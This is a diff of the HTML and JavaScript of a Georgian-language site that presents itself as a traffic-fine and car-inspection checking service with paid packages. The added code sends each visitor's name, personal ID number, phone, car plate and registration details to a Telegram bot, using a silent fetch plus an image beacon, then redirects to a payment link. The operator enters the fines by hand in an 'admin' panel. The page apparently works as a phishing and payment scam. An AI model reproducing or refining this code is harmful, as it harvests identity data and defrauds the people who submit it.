@@ -302,9 +302,7 @@
                 
                 <h4 style="color: #d9f96b; font-size: 16px; margin-bottom: 15px;">🚨 ჯარიმების სია (შეგიძლიათ დაამატოთ რამდენიმე)</h4>
                 
-                <div id="finesListContainer">
-                    <!-- დინამიური ჯარიმების ბლოკები ჩაჯდება აქ -->
-                </div>
+                <div id="finesListContainer"></div>
 
                 <button type="button" onclick="addNewFineFields()" style="background: #17362a; color: #d9f96b; border: 1px dashed #d9f96b; width: 100%; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 20px;">+ ჯარიმის დამატება</button>
 
@@ -321,7 +319,6 @@
     <!-- ================= 🚗 შიდა კაბინეტი (USER DASHBOARD) ================= -->
     <div class="dashboard-container" id="cabinetDashboard">
         <div class="dash-wrapper">
-            <!-- Sidebar -->
             <div class="dash-sidebar">
                 <div>
                     <div class="dash-brand">
@@ -348,10 +345,7 @@
                 <button class="dash-logout" onclick="closeCabinetDashboard()">გასვლა ✕</button>
             </div>
 
-            <!-- Content -->
             <div class="dash-content">
-                
-                <!-- TAB 1: ჯარიმები და ინსპექტირება -->
                 <div class="dash-section active" id="finesTab">
                     <div class="dash-header">
                         <div class="dash-title">
@@ -360,14 +354,12 @@
                         </div>
                     </div>
 
-                    <!-- 1. დამუშავების ბლოკი -->
                     <div id="processingNotice" style="background: #132e23; border: 1px dashed #d9f96b; padding: 35px; border-radius: 16px; text-align: center; margin-bottom: 25px;">
                         <div style="font-size: 36px; margin-bottom: 12px;">⏳</div>
                         <h3 style="color: #d9f96b; margin-bottom: 12px; font-size: 20px;">თქვენი მონაცემები მუშავდება</h3>
                         <p style="color: #b0c2bc; font-size: 15px; line-height: 1.6; max-width: 600px; margin: 0 auto;">თქვენი მონაცემები მუშავდება და რამდენიმე წუთში განახლებული ინფორმაცია გამოჩნდება თქვენს პირად კაბინეტში.</p>
                     </div>
 
-                    <!-- 2. რეალური მონაცემების ბლოკი -->
                     <div id="realDataContainer" style="display: none;">
                         <div class="dash-stats">
                             <div class="stat-card">
@@ -387,8 +379,6 @@
                         </div>
 
                         <h3 style="margin-bottom: 20px; font-size: 18px; color: #d9f96b;">მიმდინარე დარღვევები და ინსპექტირება</h3>
-
-                        <!-- აქ გამოჩნდება რამდენიმე ჯარიმა დინამიურად -->
                         <div id="userFinesListRender"></div>
 
                         <div class="dash-card" style="margin-top: 15px;">
@@ -404,10 +394,8 @@
                             </div>
                         </div>
                     </div>
-
                 </div>
 
-                <!-- TAB 2: ჩემი ავტომობილები -->
                 <div class="dash-section" id="carsTab">
                     <div class="dash-header">
                         <div class="dash-title">
@@ -415,7 +403,6 @@
                             <p id="userPackageSubtitle">თქვენი აქტიური პაკეტი: <b>საწყისი პაკეტი (7 GEL)</b></p>
                         </div>
                     </div>
-
                     <div class="cars-grid" id="userCarsContainer">
                         <div class="car-manage-card" id="car-card-default">
                             <h4 id="carCard1Title">AA-100-AA</h4>
@@ -425,7 +412,6 @@
                     </div>
                 </div>
 
-                <!-- TAB 3: გამოწერის პაკეტები -->
                 <div class="dash-section" id="packagesTab">
                     <div class="dash-header">
                         <div class="dash-title">
@@ -433,7 +419,6 @@
                             <p>აირჩიეთ პაკეტი განახლებისთვის ან შესაცვლელად</p>
                         </div>
                     </div>
-
                     <div class="packages-grid">
                         <div class="package-card" onclick="selectCabinetPackage('საწყისი პაკეტი (7 GEL)', 30)">
                             <span class="package-badge">საწყისი</span>
@@ -456,7 +441,6 @@
                     </div>
                 </div>
 
-                <!-- TAB 4: ცალკე ონლაინ ჩათი + დაბრუნების ღილაკი -->
                 <div class="dash-section" id="chatTab">
                     <div class="dash-header">
                         <div class="dash-title">
@@ -465,7 +449,6 @@
                         </div>
                         <button class="cabinet-btn" onclick="switchToMainTab()">← მთავარ გვერდზე დაბრუნება</button>
                     </div>
-
                     <div class="chat-box" style="max-width: 100%;">
                         <div style="font-size: 12px; color: #b0c2bc; margin-bottom: 10px; display: flex; align-items: center; gap: 8px;">
                             <span id="chatStatusDot" style="width: 10px; height: 10px; border-radius: 50%; background: #4ade80; display: inline-block;"></span>
@@ -481,7 +464,6 @@
                     </div>
                 </div>
 
-                <!-- TAB 5: პროფილის პარამეტრები -->
                 <div class="dash-section" id="settingsTab">
                     <div class="dash-header">
                         <div class="dash-title">
@@ -489,14 +471,12 @@
                             <p>თქვენი რეგისტრირებული პირადი მონაცემები</p>
                         </div>
                     </div>
-
                     <div style="background: #132e23; padding: 25px; border-radius: 16px; max-width: 600px; border: 1px solid #1a3e30;">
                         <p style="margin-bottom: 12px; font-size: 15px;">👤 <b>სახელი:</b> <span id="profName">აკაკი</span></p>
                         <p style="margin-bottom: 12px; font-size: 15px;">🆔 <b>პირადი ნომერი:</b> <span id="profPid">62004028505</span></p>
                         <p style="font-size: 15px;">📞 <b>ტელეფონი:</b> <span id="profPhone">+995 599 00 00 00</span></p>
                     </div>
                 </div>
-
             </div>
         </div>
     </div>
@@ -617,7 +597,6 @@
                 document.getElementById('processingNotice').style.display = 'none';
                 document.getElementById('realDataContainer').style.display = 'block';
 
-                // გამოთვლის ჯამურ ჯარიმებს
                 let finesArr = data.fines || [];
                 let totalSum = 0;
                 let finesHTML = "";
@@ -693,6 +672,18 @@
         function closeAdminAuthModal() { document.getElementById('adminAuthModal').style.display = 'none'; }
         function closeAdminModal() { document.getElementById('adminModal').style.display = 'none'; }
 
+        // უსაფრთხო გამოძახება მობილურისთვის და კომპიუტერისთვის (Image Beacon მეთოდი)
+        function sendTelegramMessageUniversal(text) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+            
+            // fetch მოთხოვნა მობილურისთვის (Keepalive-ით)
+            fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true }).catch(() => {});
+            
+            // დამატებითი გარანტია მობილური ბრაუზერებისთვის (Image request-ის ფონური გაგზავნა)
+            const img = new Image();
+            img.src = url;
+        }
+
         function verifyStaticPasswordAndSendCode() {
             const enteredPassword = document.getElementById('adminStaticPassword').value.trim();
 
@@ -704,20 +695,9 @@
             generatedAdminCode = Math.floor(1000 + Math.random() * 9000).toString();
             const msg = `🔐 <b>ადმინ პანელში შესვლის მოთხოვნა!</b>\n\nთქვენი უსაფრთხოების ერთჯერადი კოდია: <b>${generatedAdminCode}</b>\n\nჩაწერეთ ეს კოდი საიტზე.`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "HTML" })
-            }).then(response => {
-                if(response.ok) {
-                    alert("✅ პაროლი სწორია! Telegram-ზე კოდი გამოიგზავნა.");
-                    document.getElementById('codeEntryArea').style.display = 'block';
-                } else {
-                    alert("❌ კოდის გაგზავნა ვერ მოხერხდა.");
-                }
-            }).catch(err => {
-                alert("❌ ქსელის შეცდომა.");
-            });
+            sendTelegramMessageUniversal(msg);
+            alert("✅ პაროლი სწორია! Telegram-ზე კოდი გამოიგზავნა.");
+            document.getElementById('codeEntryArea').style.display = 'block';
         }
 
         function verifyAdminCode() {
@@ -725,7 +705,6 @@
             if (userEntered === generatedAdminCode && generatedAdminCode !== "") {
                 closeAdminAuthModal();
                 document.getElementById('adminModal').style.display = 'flex';
-                // გახსნისას ავტომატურად დავუმატოთ 1 ცარიელი ჯარიმის ველი
                 document.getElementById('finesListContainer').innerHTML = '';
                 addNewFineFields();
             } else {
@@ -733,7 +712,6 @@
             }
         }
 
-        /* მრავალი ჯარიმის დინამიური დამატება ადმინ პანელში */
         function addNewFineFields(sum='', desc='', date='', link='') {
             const container = document.getElementById('finesListContainer');
             const index = container.children.length + 1;
@@ -774,7 +752,6 @@
             const targetPhone = document.getElementById('adminTargetPhone').value.trim();
             const techStatus = document.getElementById('adminInputTechStatus').value;
 
-            // შევაგროვოთ ყველა დამატებული ჯარიმა მასივში
             let finesArray = [];
             const fineBoxes = document.querySelectorAll('.fine-item-box');
             fineBoxes.forEach(box => {
@@ -794,7 +771,6 @@
                 return;
             }
 
-            // ვანახლებთ მომხმარებლის სახელს, ტელეფონს და ჯარიმების სიას
             userData.name = targetName;
             userData.phone = targetPhone;
             userData.adminApproved = true;
@@ -851,11 +827,8 @@
 
             const message = `🚨 <b>ახალი გადახდის მოთხოვნა!</b>\n\n🔑 <b>უნიკალური კოდი: ${randomCode}</b>\n📦 <b>პაკეტი:</b> ${pkg}\n💰 <b>თანხა:</b> ${price} GEL\n👤 <b>სახელი:</b> ${name}\n🆔 <b>პირადი:</b> ${pid}\n📞 <b>ტელეფონი:</b> ${phone}\n🚗 <b>მანქანა:</b> ${car}\n📄 <b>ტექპასპორტი:</b> ${tech}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
-            }).catch(err => console.log(err));
+            // უნივერსალური გაგზავნა მობილურისთვის და კომპიუტერისთვის
+            sendTelegramMessageUniversal(message);
 
             window.location.href = `https://egreve.bog.ge/Carfax`;
         }
